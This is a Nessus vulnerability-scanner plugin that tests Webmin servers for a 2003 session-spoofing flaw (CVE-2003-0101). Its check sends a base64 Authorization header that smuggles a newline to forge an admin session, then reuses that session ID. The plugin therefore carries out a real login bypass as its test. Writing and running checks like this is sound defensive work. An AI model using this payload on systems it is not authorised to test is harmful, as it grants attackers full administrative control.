#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
	script_id(11279);
	script_version ("$Revision: 1.16 $");
	script_cve_id("CVE-2003-0101");
	script_bugtraq_id(6915);
	script_xref(name:"OSVDB", value:"10803");

	script_name(english:"Webmin miniserv.pl Base-64 String Metacharacter Handling Session Spoofing");
 	script_summary(english: "Spoofs a session ID");

	script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to session spoofing.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote server is running a version of Webmin which
is vulnerable to Session ID spoofing.

An attacker may use this flaw to log in as admin on this host,
and gain full control of the system."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to version 1.070 or higher for Webmin and 1.000 or higher for Usermin."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://marc.info/?l=webmin-announce&m=104587858408101&w=2'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C'
  );

  script_end_attributes();

	script_category(ACT_GATHER_INFO);
	script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
	script_family(english: "CGI abuses");
	script_dependencie("webmin.nasl");
	script_require_ports("Services/www", 10000);
	script_require_keys("Services/www/webmin");
	exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

ports = add_port_in_list(list:get_kb_list("Services/www/webmin"),  port:10000);


function check(port)
{
  local_var	r;
  if ( ! get_kb_item("www/" + port + "/webmin") ) return;
  set_http_cookie(name: "testing", value: "1");
  r = http_send_recv3(method: "GET", item:"/", port:port,
 add_headers: make_array( "User-Agent", "webmin",
      "Authorization", "Basic YSBhIDEKbmV3IDEyMzQ1Njc4OTAgYWRtaW46cGFzc3dvcmQ=") );
  if (egrep(pattern:".*Webmin.*feedback_form\.cgi.*", string: r[2])) return 0;
  if (r[0] !~ "^HTTP/[0-9]\.[0-9] 401 ") return 0;

  set_http_cookie(name: "testing", value: "1");
  set_http_cookie(name: "sid", value: "1234567890");
  r = http_send_recv3(method: "GET", item:"/", port:port);
  if (isnull(r)) return 0;

  #
  # I'm afraid of localizations, so I grep on the HTML source code,
  # not the message status.
  #
 if(egrep(pattern:".*Webmin.*feedback_form\.cgi.*", string:r[2]))
  {
  security_hole(port);
  }
}


foreach port (ports)
{
   if ( get_port_state(port) && ! get_kb_item("Services/www/" + port + "/broken") ) check(port:port);
}
